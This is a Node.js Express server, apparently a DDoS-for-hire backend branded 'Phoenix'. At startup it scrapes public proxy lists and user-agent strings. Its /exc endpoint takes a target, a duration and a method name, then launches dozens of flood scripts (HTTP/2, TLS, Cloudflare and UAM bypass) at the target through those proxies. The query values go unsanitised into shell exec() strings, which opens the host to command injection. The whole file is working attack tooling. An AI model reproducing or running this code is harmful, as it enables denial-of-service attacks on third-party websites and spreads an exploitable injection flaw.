const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`IP : ${data.origin}:${port}`);
  return data;
}

app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;
  res.status(200).json({
    message: 'API request received. Executing script shortly, By JooModdss #Phoenix',
    target,
    time,
    methods
  });

  
  if (methods === 'Kill') {
  console.log(`Phoenix Attacking`)
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node phoenix/tlsv2.js ${target} ${time} 8 3`);
    exec(`node phoenix/bypassv2.js uam ${time} 10 proxy.txt 100 ${target}`);
    exec(`node phoenix/blast.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node phoenix/floodv2.js ${target} ${time} 8 3`);
    exec(`node phoenix/sky.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node phoenix/raw.js ${target} ${time}`);
    exec(`node phoenix/uam.js ${target} ${time} 100 10 proxy.txt`);
   exec(`node phoenix/https.js ${target} ${time} 100 10 proxy.txt`);
   exec(`node phoenix/storm.js ${target} ${time} 100 10 proxy.txt`);
   exec(`node phoenix/HTTP-CUSTOM.js HEAD ${target} ${time} 10 7 proxy.txt --randrate --full --legit --query 1`);
   exec(`node phoenix/flood.js ${target} ${time} 100 10 proxy.txt`);
   exec(`node phoenix/darbost.js ${target} ${time} 100 10 proxy.txt`);
  exec(`node phoenix/bypass.js ${target} ${time} 42 10 proxy.txt`);
  exec(`node phoenix/boost.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'Phoenix') {
  console.log(`Phoenix Attacking`)
   exec(`node ./lib/cache/HTTP-X.js ${target} ${time} 80 10 proxy.txt`)
    exec(`node ./lib/cache/StarsXPidoras.js ${target} ${time} 80 10 proxy.txt`)
   exec(`node ./lib/cache/StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${target}`);
   exec(`node ./lib/cache/StarsXRaw.js ${target} ${time}`);
   exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 100 10 proxy.txt`);
   exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
   exec(`node ./lib/cache/StarsXTls.js ${target} ${time} 100 10`);
   exec(`node ./lib/cache/StarsXStrike.js GET ${target} ${time} 10 90 proxy.txt --full`);
   exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./lib/cache/StarsXKill.js ${target} ${time} 100 10`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'Exorcist') {
    console.log(`Phoenix Attacking`)
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'Blaze') {
    console.log(`Phoenix Attacking`)
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'Ultimate') {
   console.log(`Phoenix Attacking`)
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP-RAW.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'Exercist') {
   console.log(`Phoenix Attacking`)
    exec(`node ./methods/novaria.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/CFbypass.js ${target} ${time}`);
    exec(`node ./methods/bypassv1 ${target} proxy.txt ${time} 100 10`);
    exec(`node ./methods/hyper.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/TLS-LOST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/tls.vip ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
